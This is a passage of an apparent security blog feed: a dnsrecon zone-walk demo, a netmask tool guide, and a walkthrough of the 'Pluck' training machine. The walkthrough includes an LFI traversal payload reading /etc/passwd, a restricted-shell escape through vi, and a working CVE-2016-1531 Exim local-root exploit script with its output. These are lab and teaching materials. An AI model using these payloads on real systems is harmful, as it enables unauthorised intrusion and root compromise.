[*]      NSEC _sip._tcp
[*]      NSEC sqli
[*]      NSEC vpn
[*]      NSEC asfdbbox
[*]      NSEC deadbeef
[*]      NSEC intns1
[*]      NSEC 157.177.147.217.IN-ADDR.ARPA
[*]      NSEC asfdbauthdns
[*]      NSEC dc-office
[*]      NSEC alltcpportsopen.firewall.test
[*]      NSEC canberra-office
[*]      NSEC robinwood
[*]      NSEC testing
[*]      NSEC www
[*]      NSEC Info
[*]      NSEC dr
[*]      NSEC @
[*]      NSEC asfdbvolume
[*]      NSEC xss
[*]      NSEC email
[*]      NSEC internal
[*]      NSEC cmdexec
[*]      NSEC intns2
[*]      NSEC office
[*]      NSEC contact
[*]      NSEC owa
[*]      NSEC staging
[*]      NSEC sshock
[*]      NSEC sip
[*]      NSEC rp
[*]      NSEC DZC
[*]      NSEC ipv6actnow.org
[-] A timeout error occurred please make sure you can reach the target DNS Servers
[-] directly and requests are not being filtered. Increase the timeout from 3.0 second
[-] to a higher number with --lifetime &lt;time&gt; option.
</code></p>

<p>Here we see some interesting records that might warrant an additional explanation:</p>

<p><strong>SOA</strong> &ndash; the State of Authority record indicates which DNS server is the best source of information for the specified domain</p>

<p><strong>HINFO</strong> specifies the host / server&rsquo;s type of CPU and operating system. We can see a Casio here, which is highly unlikely xD</p>

<p><strong>LOC</strong> &ndash; geolocation information, here in latitude / longitude values</p>

<p><strong>TXT</strong> &ndash; text records, with plenty of information like mail addresses, phone numbers, XSS and shellshock attempts</p>

<ul>
<li>map internal network with DNSSEC zone walk</li>
</ul>


<p><code>
dnsrecon -d zonetransfer.me -z
[...]
[*] Performing NSEC Zone Walk for zonetransfer.me
[*] Getting SOA record for zonetransfer.me
[*] Name Server 81.4.108.41 will be used
[*]      A zonetransfer.me 217.147.177.157
[*]      SRV _sip._tcp.zonetransfer.me www.zonetransfer.me 217.147.177.157 5060 0
[*]      A 157.177.147.217.IN-ADDR.ARPA.zonetransfer.me no_ip
[*]      A asfdbauthdns.zonetransfer.me no_ip
[*]      A asfdbbox.zonetransfer.me 127.0.0.1
[*]      A asfdbvolume.zonetransfer.me no_ip
[*]      A canberra-office.zonetransfer.me 202.14.81.230
[*]      A cmdexec.zonetransfer.me no_ip
[*]      A contact.zonetransfer.me no_ip
[*]      A dc-office.zonetransfer.me 143.228.181.132
[*]      AAAA deadbeef.zonetransfer.me dead:beaf::
[*]      A dr.zonetransfer.me no_ip
[*]      A DZC.zonetransfer.me no_ip
[*]      A email.zonetransfer.me 74.125.206.26
[*]      A Info.zonetransfer.me no_ip
[*]      A internal.zonetransfer.me no_ip
[*]      A intns1.zonetransfer.me 167.88.42.94
[*]      A intns2.zonetransfer.me 167.88.42.94
[*]      A office.zonetransfer.me 4.23.39.254
[*]      AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
[*]      A owa.zonetransfer.me 207.46.197.32
[*]      A robinwood.zonetransfer.me no_ip
[*]      A rp.zonetransfer.me no_ip
[*]      A sip.zonetransfer.me no_ip
[*]      A sqli.zonetransfer.me no_ip
[*]      A sshock.zonetransfer.me no_ip
[*]      A staging.zonetransfer.me 52.64.62.190
[*]      A staging.zonetransfer.me 13.54.224.164
[*]      A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
[*]      CNAME testing.zonetransfer.me www.zonetransfer.me
[*]      A www.zonetransfer.me 217.147.177.157
[*]      A vpn.zonetransfer.me 174.36.59.154
[*]      A www.zonetransfer.me 217.147.177.157
[*]      A xss.zonetransfer.me no_ip
[*] 34 records found
</code></p>

<ul>
<li>sample CSV</li>
</ul>


<p><img class="center" src="/images/tools/dnsrecon.png" title="&lsquo;dnsrecon&rsquo; &lsquo;dnsrecon CSV report&rsquo;" ></p>

<p>```</p>

<hr />

<p>/ The only way to keep your health is to  \
| eat what you don&rsquo;t want, drink what you |
| don&rsquo;t like, and do what you&rsquo;d rather    |
| not.                                    |
|                                         |
\ &mdash; Mark Twain                           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[netmask - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools/"/>
    <updated>2017-07-07T05:55:22-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to convert between different types of netmasks and network addresses, or generate optimized netmasks for firewall rules. netmask can take care of your netmasks!</p>

<p>Homepage: <a href="https://github.com/tlby/netmask">https://github.com/tlby/netmask</a></p>

<!-- more -->


<h2>netmask description</h2>

<blockquote><p>This  program  accepts and produces a variety of common network address
and netmask formats.  Not only can it convert address and netmask notations,  but it will optimize the masks to
generate the smallest list of rules.  This is very handy if you&rsquo;ve  ever  configured  a  firewall  or
router  and  some  nasty  network administrator before you decided that
base 10 numbers were good places to start and end groups of machines.</p></blockquote>

<p>Manpage: <a href="https://linux.die.net/man/1/netmask">https://linux.die.net/man/1/netmask</a></p>

<h2>netmask options</h2>

<p>```
This is netmask, an address netmask generation utility
Usage: netmask spec [spec &hellip;]
  -h, &mdash;help            Print a summary of the options
  -v, &mdash;version         Print the version number
  -d, &mdash;debug           Print status/progress information
  -s, &mdash;standard        Output address/netmask pairs
  -c, &mdash;cidr            Output CIDR format address lists
  -i, &mdash;cisco           Output Cisco style address lists
  -r, &mdash;range           Output ip address ranges
  -x, &mdash;hex         Output address/netmask pairs in hex
  -o, &mdash;octal           Output address/netmask pairs in octal
  -b, &mdash;binary          Output address/netmask pairs in binary
  -n, &mdash;nodns           Disable DNS lookups for addresses
  -f, &mdash;files           Treat arguments as input files
Definitions:
  a spec can be any of:</p>

<pre><code>address
address:address
address:+address
address/mask
</code></pre>

<p>  an address can be any of:</p>

<pre><code>N       decimal number
0N      octal number
0xN     hex number
N.N.N.N dotted quad
hostname    dns domain name
</code></pre>

<p>  a mask is the number of bits set to one from the left
```</p>

<h2>netmask usage</h2>

<ul>
<li>output standard address / netmask pairs</li>
</ul>


<p><code>
root@kali:~# netmask -s 192.168.217.0/24
  192.168.217.0/255.255.255.0  
</code></p>

<ul>
<li>CIDR notation</li>
</ul>


<p><code>
root@kali:~# netmask -c google.com
  216.58.210.14/32
2a00:1450:4001:81d::200e/128
</code></p>

<ul>
<li>Cisco-style notation</li>
</ul>


<p><code>
root@kali:~# netmask -i google.com
  216.58.210.14 0.0.0.0        
2a00:1450:4001:81d::200e ::   
</code></p>

<ul>
<li>IP ranges</li>
</ul>


<p><code>
root@kali:~# netmask -r 192.168.217.0/24
  192.168.217.0-192.168.217.255 (256)
</code></p>

<p>```</p>

<hr />

<p>&lt; Your ignorance cramps my conversation. ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Got Pluck?]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/06/got-pluck/"/>
    <updated>2017-07-06T06:28:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/06/got-pluck</id>
    <content type="html"><![CDATA[<p>New day, new machine to hack! Today&rsquo;s target is called Pluck.</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results:</p>

<p><code>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pluck
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  llmnr?
</code></p>

<p>First order of business, the web server:</p>

<p><img class="center" src="/images/pentest/pluck/pluck.png" title="&lsquo;pluck&rsquo; &lsquo;pluck&rsquo;" ></p>

<p>I ran Nikto on it and it revealed a couple of vulnerabilities:</p>

<p><code>
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)
</code></p>

<p>First, I went to the admin page and it seems vulnerable to SQL injection:</p>

<p><img class="center" src="/images/pentest/pluck/admin.png" title="&lsquo;admin&rsquo; &lsquo;admin sqli&rsquo;" ></p>

<p>I fired up sqlmap but I couldn&rsquo;t get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at <em>/etc/passwd</em>:</p>

<p><code>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:108:65534::/var/lib/lxd/:/bin/false
uuidd:x:109:114::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:112:1::/var/cache/pollinate:/bin/false
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
Debian-exim:x:113:119::/var/spool/exim4:/bin/false
peter:x:1001:1001:,,,:/home/peter:/bin/bash
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
</code></p>

<p>The last entry is interesting. I used the LFI to look at the script:</p>

<p>```</p>

<h6>#</h6>

<h1>Server Backup script</h1>

<h6>#</h6>

<h1>Backup directories in /backups so we can get it via tftp</h1>

<p>echo &ldquo;Backing up data&rdquo;
tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2&amp; > /dev/null
echo &ldquo;Backup complete&rdquo;
```</p>

<p>A TFTP reference, and I didn&rsquo;t scan for UDP ports. I went back to Nmap real quick:</p>

<p>```
nmap -T4 -sU -p69 192.168.217.147</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-06 09:59 EDT
Nmap scan report for 192.168.217.147
Host is up (0.00016s latency).
PORT   STATE         SERVICE
69/udp open|filtered tftp
```</p>

<p>I got the archive via T<a href="FTP:">FTP:</a></p>

<p><code>
tftp 192.168.217.147
tftp&gt; get /backups/backup.tar
Received 1824718 bytes in 1.4 seconds
</code></p>

<p>Extracted it to find some home directory contents, besides the source for the website:</p>

<p><code>
tar -xvf backup.tar
home/
home/bob/
home/bob/.bashrc
home/bob/.sudo_as_admin_successful
home/bob/.profile
home/bob/.bash_logout
home/paul/
home/paul/keys/
home/paul/keys/id_key3.pub
home/paul/keys/id_key2.pub
home/paul/keys/id_key2
home/paul/keys/id_key4.pub
home/paul/keys/id_key5.pub
home/paul/keys/id_key6
home/paul/keys/id_key1
home/paul/keys/id_key5
home/paul/keys/id_key1.pub
home/paul/keys/id_key6.pub
home/paul/keys/id_key4
home/paul/keys/id_key3
home/paul/.bashrc
home/paul/.profile
home/paul/.bash_logout
home/peter/
home/peter/.bashrc
home/peter/.profile
home/peter/.bash_logout
var/www/html/
var/www/html/fonts/
var/www/html/fonts/glyphicons-halflings-regular.svg
var/www/html/fonts/glyphicons-halflings-regular.woff2
var/www/html/fonts/glyphicons-halflings-regular.ttf
var/www/html/fonts/glyphicons-halflings-regular.woff
var/www/html/fonts/glyphicons-halflings-regular.eot
var/www/html/about.php
var/www/html/index.php
var/www/html/footer.php
var/www/html/css/
var/www/html/css/bootstrap.css.map
var/www/html/css/bootstrap.min.css.map
var/www/html/css/bootstrap-theme.css
var/www/html/css/bootstrap-theme.min.css
var/www/html/css/bootstrap.min.css
var/www/html/css/bootstrap-theme.min.css.map
var/www/html/css/bootstrap-theme.css.map
var/www/html/css/bootstrap.css
var/www/html/header.php
var/www/html/admin.php
var/www/html/js/
var/www/html/js/jquery.min.js
var/www/html/js/bootstrap.js
var/www/html/js/npm.js
var/www/html/js/bootstrap.min.js
</code></p>

<p>Bob&rsquo;s directory:</p>

<p><code>
root@kali:~/home/bob# ls -la
total 20
drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful
</code></p>

<p>That sudo file was empty. On to paul:</p>

<p><code>
root@kali:~/home/paul# ls -la
total 24
drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
root@kali:~/home/paul# ls -la keys/
total 56
drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub
</code></p>

<p>It looks like paul didn&rsquo;t put much effort into securing his SSH keys. Lastly, peter:</p>

<p><code>
root@kali:~/home/peter# ls -la
total 20
drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile
</code></p>

<h2>Privilege escalation</h2>

<p>Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:</p>

<p><img class="center" src="/images/pentest/pluck/pdmenu.png" title="&lsquo;pdmenu&rsquo; &lsquo;pdmenu&rsquo;" ></p>

<p>So, what is pdmenu?</p>

<blockquote><p>Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
for inexperienced users, or it can just be ran at the command line as a handy menu.</p></blockquote>

<p>Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">SANS article</a> about this exact topic. To get a proper shell, I typed the following in vi&rsquo;s command mode:</p>

<p><code>
:set shell=/bin/bash
:!bash
</code></p>

<p>That dropped me into paul&rsquo;s shell:</p>

<p><code>
paul@pluck:~$ id
uid=1002(paul) gid=1002(paul) groups=1002(paul)
</code></p>

<p>SUID enumeration led me to the next step:</p>

<p><code>
paul@pluck:~$ find / -perm -4000 2&gt;/dev/null
/usr/exim/bin/exim-4.84-7
/usr/bin/passwd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/s-nail/s-nail-privsep
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/bin/ping
/bin/ntfs-3g
</code></p>

<p>Exim is a MTA similar to sendmail. Googling for an exploit yielded a <a href="https://www.exploit-db.com/exploits/39535/">local root exploit</a>. I used vi to create a shell script with the exploit code, changed it to executable and ran it:</p>

<p>```
paul@pluck:~$ vi rootme.sh
paul@pluck:~$ cat rootme.sh
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm &lt;&lt; EOF
package root;
use strict;
use warnings;</p>

<p>system(&ldquo;/bin/sh&rdquo;);
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</p>

<p>paul@pluck:~$ ./rootme.sh
[ CVE-2016-1531 local root exploit</p>

<h1>whoami</h1>

<p>root
```</p>

<p>The flag is mine!</p>

<p>```</p>

<h1>cat /root/flag.txt</h1>

<p>Congratulations you found the flag</p>

<hr />

<h6>((((((((((((((((((((((((((((((</h6>

<h6>###   (((((((((((((((((((((((((((</h6>

<p>,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########                   <br/>
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########                  <br/>
@@@,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</p>

<h6>####   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>

<h6>#   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>

<p>```</p>

<p>Interesting twist on this VM with the pdbmenu escape!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escape restricted Linux shells</a></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: How many Zen masters does it take to \
| screw in a light bulb? A: None. The     |
| Universe spins the bulb, and the Zen    |
| master stays out                        |
|                                         |
\ of the way.                             /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
